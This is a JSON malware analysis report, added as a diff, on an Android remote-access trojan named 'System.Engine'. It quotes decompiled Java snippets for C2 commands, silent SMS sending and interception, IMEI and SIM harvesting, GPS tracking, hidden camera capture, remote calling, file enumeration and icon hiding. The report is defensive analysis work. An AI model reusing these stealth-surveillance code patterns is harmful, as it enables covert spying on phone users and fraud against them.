@@ -1,0 +1,289 @@
+{
+  "APK信息": {
+    "文件名": "bf5486196de824390cde924a76837873f32978d6fcccc0025d27de8ba3244ce9.apk",
+    "sha256": "bf5486196de824390cde924a76837873f32978d6fcccc0025d27de8ba3244ce9",
+    "包名": "my.androidsys.client",
+    "应用名": "System.Engine",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 282.0
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Linout\\Protocol;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final short CONNECT = 2;\n    public static final short ENVOI_CMD = 3;\n    public static final short DISCONNECT = 5;\n    public static final int ARG_STREAM_AUDIO_DOWN_CALL = 3;\n    public static final int ARG_STREAM_AUDIO_MIC = 1;\n    public static final int ARG_STREAM_AUDIO_UPDOWN_CALL = 4;\n    public static final int ARG_STREAM_AUDIO_UP_CALL = 2;\n    public static final String KEY_SEND_SMS_BODY = \"body\";\n    public static final String KEY_SEND_SMS_NUMBER = \"number\";",
+          "malicious_code_snippet_context": "      public static final int ARG_STREAM_AUDIO_MIC = 1;\n      public static final int ARG_STREAM_AUDIO_UPDOWN_CALL = 4;\n      public static final int ARG_STREAM_AUDIO_UP_CALL = 2;\n>>>     public static final short CONNECT = 2;\n>>>     public static final short DEBUG = 0;\n>>>     public static final short DISCONNECT = 5;\n>>>     public static final short ENVOI_CMD = 3;\n>>>     public static final short ERROR = 1;\n>>>     public static final short GET_PREFERENCE = 21;\n>>>     public static final int HEADER_LENGTH_DATA = 15;\n>>>     public static final short INFOS = 4;\n>>>     public static final String KEY_SEND_SMS_BODY = \"body\";\n      public static final String KEY_SEND_SMS_NUMBER = \"number\";\n      public static final int MAX_PACKET_SIZE = 2048;\n      public static final int NO_MORE = 1;",
+          "behavior_description": "该代码定义了一个C2通信协议类，包含连接管理(CONNECT/DISCONNECT)、命令发送(ENVOI_CMD)、音频流控制(ARG_STREAM_AUDIO_MIC等，用于麦克风监听和通话录音)、以及短信发送控制(KEY_SEND_SMS_BODY/NUMBER)等指令常量。这些常量构成了恶意软件与远程C2服务器之间的通信协议框架，表明该APK具备远程控制能力，可接收并执行来自C2服务器的窃听、短信欺诈等指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "SMS_RECEIVED"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lmy\\androidsys\\client\\ProcessCommand;",
+          "method_signature": "if(text.getBytes()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.commande == Protocol.SEND_SMS) {\n    Map<String, String> information = EncoderHelper.decodeHashMap(this.arguments.array());\n    String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);\n    String text = information.get(Protocol.KEY_SEND_SMS_BODY);\n    if (text.getBytes().length < 167) {\n        SmsManager.getDefault().sendTextMessage(num, null, text, null, null);\n    } else {\n        ArrayList<String> multipleMsg = MessageDecoupator(text);\n        SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);\n    }\n    this.client.sendInformation(\"SMS sent\");\n}",
+          "malicious_code_snippet_context": "              this.client.toast.show();\n              return;\n          }\n>>>         if (this.commande == Protocol.SEND_SMS) {\n>>>             this.MyFileHandler = null;\n>>>             Map<String, String> information = EncoderHelper.decodeHashMap(this.arguments.array());\n>>>             String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);\n>>>             String text = information.get(Protocol.KEY_SEND_SMS_BODY);\n>>>             if (text.getBytes().length < 167) {\n>>>                 SmsManager.getDefault().sendTextMessage(num, null, text, null, null);\n>>>             } else {\n>>>                 ArrayList<String> multipleMsg = MessageDecoupator(text);\n>>>                 SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);\n>>>             }\n>>>             this.client.sendInformation(\"SMS sent\");\n              try {\n                  Thread.sleep(3000L);\n                  Uri uriSms = Uri.parse(\"content://sms/sent\");",
+          "behavior_description": "代码接收来自远程C2服务器的指令，当指令为SEND_SMS时，从指令参数中解码出目标手机号和短信内容，利用SmsManager静默发送短信，并向服务器回报发送成功状态，随后查询已发送信箱以确认发送结果。此行为属于典型的远程控制短信欺诈，可能导致用户遭受资费消耗或传播钓鱼链接。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lmy\\androidsys\\client\\Client;",
+          "method_signature": "registerSMSAndCall()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void registerSMSAndCall() {\n    IntentFilter filter = new IntentFilter();\n    filter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\n    registerReceiver(this.SMSreceiver, filter);\n    IntentFilter filter2 = new IntentFilter();\n    filter2.addAction(\"android.intent.action.PHONE_STATE\");\n    registerReceiver(this.Callreceiver, filter2);\n}",
+          "malicious_code_snippet_context": "          this.elapsedTime = 1;\n      }\n  \n>>>     public void registerSMSAndCall() {\n>>>         IntentFilter filter = new IntentFilter();\n>>>         filter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\n>>>         registerReceiver(this.SMSreceiver, filter);\n>>>         IntentFilter filter2 = new IntentFilter();\n>>>         filter2.addAction(\"android.intent.action.PHONE_STATE\");\n>>>         registerReceiver(this.Callreceiver, filter2);\n>>>     }\n  \n      @Override // inout.Controler\n      public void Storage(TransportPacket p, String i) {",
+          "behavior_description": "该方法注册了一个BroadcastReceiver监听android.provider.Telephony.SMS_RECEIVED广播，用于拦截设备接收到的短信。同时注册了PHONE_STATE监听来电状态。在已确认的恶意样本中，此行为通常用于静默拦截短信（如银行验证码、OTP），将短信内容转发给C2服务器或隐藏短信通知，使用户无法察觉。数据流向：系统短信广播SMS_RECEIVED(source) → registerReceiver注册拦截器(sink)，拦截后可对短信内容进行任意处理。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lmy\\androidsys\\Library\\AdvancedSystemInfo;",
+          "method_signature": "phoneInfo()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "高",
+          "malicious_code_snippet": "TelephonyManager tm = (TelephonyManager) this.ctx.getSystemService(\"phone\");\nthis.p.setPhoneNumber(tm.getLine1Number());\nthis.p.setIMEI(tm.getDeviceId());\nthis.p.setSoftwareVersion(tm.getDeviceSoftwareVersion());\nthis.p.setCountryCode(tm.getNetworkCountryIso());\nthis.p.setOperatorCode(tm.getNetworkOperator());\nthis.p.setOperatorName(tm.getNetworkOperatorName());\nthis.p.setSimOperatorCode(tm.getSimOperator());\nthis.p.setSimOperatorName(tm.getSimOperatorName());\nthis.p.setSimCountryCode(tm.getSimCountryIso());\nthis.p.setSimSerial(tm.getSimSerialNumber());",
+          "malicious_code_snippet_context": "      }\n  \n      public void phoneInfo() {\n>>>         TelephonyManager tm = (TelephonyManager) this.ctx.getSystemService(\"phone\");\n>>>         this.p.setPhoneNumber(tm.getLine1Number());\n>>>         this.p.setIMEI(tm.getDeviceId());\n>>>         this.p.setSoftwareVersion(tm.getDeviceSoftwareVersion());\n>>>         this.p.setCountryCode(tm.getNetworkCountryIso());\n>>>         this.p.setOperatorCode(tm.getNetworkOperator());\n>>>         this.p.setOperatorName(tm.getNetworkOperatorName());\n>>>         this.p.setSimOperatorCode(tm.getSimOperator());\n>>>         this.p.setSimOperatorName(tm.getSimOperatorName());\n>>>         this.p.setSimCountryCode(tm.getSimCountryIso());\n>>>         this.p.setSimSerial(tm.getSimSerialNumber());\n      }\n  \n      public void networkInfo() {",
+          "behavior_description": "通过 TelephonyManager 系统服务获取大量设备唯一标识和SIM卡敏感信息，包括手机号(getLine1Number)、IMEI(getDeviceId)、SIM序列号(getSimSerialNumber)、运营商信息等，将其存入profile对象(this.p)中。该方法与networkInfo()、androidInfo()、sensorsInfo()等并列调用，构成系统化的设备指纹采集模块，收集的数据极有可能在后续被拼接并上传至C2服务器，造成用户隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION"
+        ],
+        "字符串": [
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lmy\\androidsys\\Library\\GPSListener;",
+          "method_signature": "GPSListener(LocationListener locationListener, String prov, int chan)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.mlocManager = (LocationManager) ((Context) locationListener).getSystemService(\"location\");\nthis.mlocManager.requestLocationUpdates(prov, 0L, 0.0f, this.listener);\nthis.packet = new GPSPacket(loc.getLatitude(), loc.getLongitude(), loc.getAltitude(), loc.getSpeed(), loc.getAccuracy());",
+          "malicious_code_snippet_context": "          this.listener = locationListener;\n          this.provider = prov;\n          this.channel = chan;\n>>>         this.mlocManager = (LocationManager) ((Context) locationListener).getSystemService(\"location\");\n>>>         this.mlocManager.requestLocationUpdates(prov, 0L, 0.0f, this.listener);\n>>>     }\n  \n      public void stop() {\n          if (this.mlocManager != null) {",
+          "behavior_description": "该代码通过 LocationManager.requestLocationUpdates() 注册持续的位置更新监听，获取设备的 GPS 位置数据（纬度、经度、海拔、速度、精度），并将其打包成 GPSPacket 对象进行编码，疑似为后续数据外传做准备。类路径使用伪装包名 my.androidsys 混淆视听，在已确认的恶意样本中，此行为属于隐私窃取中的位置追踪。数据流向：requestLocationUpdates 获取实时位置 → getLatitude/getLongitude 等读取详细位置信息 → GPSPacket 打包编码（疑似待外传）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lmy\\androidsys\\Library\\PhotoTaker;",
+          "method_signature": "if(this.cam == null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SurfaceView view = new SurfaceView(this.ctx);\nthis.holder = view.getHolder();\nthis.cam.setPreviewDisplay(this.holder);\nthis.cam.startPreview();\nthis.cam.takePicture(null, null, this.pic);",
+          "malicious_code_snippet_context": "              if (this.cam == null) {\n                  return false;\n              }\n>>>             SurfaceView view = new SurfaceView(this.ctx);\n>>>             try {\n>>>                 this.holder = view.getHolder();\n>>>                 this.cam.setPreviewDisplay(this.holder);\n>>>                 this.cam.startPreview();\n                  this.cam.takePicture(null, null, this.pic);\n                  return true;\n              } catch (IOException e) {",
+          "behavior_description": "代码创建了一个未添加到任何可见UI布局的SurfaceView作为相机预览载体，随后调用startPreview()和takePicture()在无用户界面的情况下静默触发拍照，照片数据通过pic回调进行后续处理（如保存或上传），实现隐私窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lmy\\androidsys\\client\\ProcessCommand;",
+          "method_signature": "if(this.commande == Protocol.GIVE_CALL)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.commande == Protocol.GIVE_CALL) {\n    String uri = \"tel:\" + new String(this.arguments.array());\n    this.intent = new Intent(\"android.intent.action.CALL\", Uri.parse(uri));\n    this.intent.setFlags(268435456);\n    this.client.startActivity(this.intent);\n}",
+          "malicious_code_snippet_context": "                  return;\n              }\n          }\n>>>         if (this.commande == Protocol.GIVE_CALL) {\n>>>             this.MyFileHandler = null;\n>>>             String uri = \"tel:\" + new String(this.arguments.array());\n>>>             this.intent = new Intent(\"android.intent.action.CALL\", Uri.parse(uri));\n>>>             this.intent.setFlags(268435456);\n>>>             this.client.startActivity(this.intent);\n              return;\n          }\n          if (this.commande == Protocol.GET_SMS) {",
+          "behavior_description": "代码接收远程C2服务器下发的GIVE_CALL命令，从命令参数中提取电话号码，构造tel: URI并使用ACTION_CALL Intent直接发起电话呼叫（非ACTION_DIAL，无需用户确认），属于远程控制型恶意行为，可导致用户被拨打付费号码造成经济损失",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lmy\\androidsys\\client\\ProcessCommand;",
+          "method_signature": "if(!mnt.exists()",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.commande == Protocol.LIST_DIR) {\n    String file = new String(this.arguments.array());\n    if (file.equalsIgnoreCase(\"ext\")) {\n        File mnt = new File(\"/storage\");\n        if (!mnt.exists()) {\n            mnt = new File(\"/mnt\");\n        }\n        File[] roots = mnt.listFiles(new FileFilter() {\n            public boolean accept(File pathname) {\n                if (pathname.isDirectory() && pathname.exists() && pathname.canWrite()) {\n                    return !pathname.isHidden();\n                }\n                return false;\n            }\n        });\n    }\n}",
+          "malicious_code_snippet_context": "              }\n              return;\n          }\n>>>         if (this.commande == Protocol.LIST_DIR) {\n>>>             this.MyFileHandler = null;\n>>>             this.client.sendInformation(\"List directory request received\");\n>>>             String file = new String(this.arguments.array());\n>>>             if (file.equalsIgnoreCase(\"ext\")) {\n>>>                 File mnt = new File(\"/storage\");\n>>>                 if (!mnt.exists()) {\n>>>                     mnt = new File(\"/mnt\");\n>>>                 }\n>>>                 try {\n>>>                     File[] roots = mnt.listFiles(new FileFilter() { // from class: my.androidsys.client.ProcessCommand.1\n>>>                         @Override // java.io.FileFilter\n>>>                         public boolean accept(File pathname) {\n>>>                             try {\n>>>                                 if (pathname.isDirectory() && pathname.exists() && pathname.canWrite()) {\n>>>                                     return !pathname.isHidden();\n>>>                                 }\n                                  return false;\n                              } catch (Exception e4) {\n                                  return false;",
+          "behavior_description": "该代码属于远程控制木马(RAT)的命令处理模块 ProcessCommand。当收到C2服务器下发的 LIST_DIR 指令且参数为 \"ext\" 时，代码会枚举设备外部存储挂载点（/storage 或 /mnt），并筛选出可写、非隐藏的目录。这是攻击者对受感染设备文件系统进行侦察的关键步骤，为后续的文件窃取、篡改或写入恶意文件做准备。数据流向：远程C2指令(this.commande/this.arguments) → 文件系统枚举(listFiles())。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lmy\\androidsys\\client\\LauncherActivity;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager p = LauncherActivity.this.getPackageManager(); ComponentName componentName = new ComponentName(BuildConfig.APPLICATION_ID, \"my.androidsys.client.LauncherActivity\"); p.setComponentEnabledSetting(componentName, 2, 1); Intent startMain = new Intent(\"android.intent.action.MAIN\"); startMain.addCategory(\"android.intent.category.HOME\"); startMain.setFlags(268435456); LauncherActivity.this.startActivity(startMain);",
+          "malicious_code_snippet_context": "                      e2.printStackTrace();\n                  }\n                  try {\n>>>                     PackageManager p = LauncherActivity.this.getPackageManager();\n                      ComponentName componentName = new ComponentName(BuildConfig.APPLICATION_ID, \"my.androidsys.client.LauncherActivity\");\n                      p.setComponentEnabledSetting(componentName, 2, 1);\n                  } catch (Exception e3) {",
+          "behavior_description": "用户点击应用图标后，代码先启动恶意服务Client，显示伪装布局main3，然后Thread.sleep(5000)延迟5秒，接着调用PackageManager.setComponentEnabledSetting()将自身LauncherActivity组件设置为COMPONENT_ENABLED_STATE_DISABLED(值=2)，使应用图标从桌面消失，最后通过ACTION_MAIN+CATEGORY_HOME Intent将用户送回桌面。这是典型的恶意软件图标隐藏技术，防止用户发现并卸载恶意应用，同时后台服务持续运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
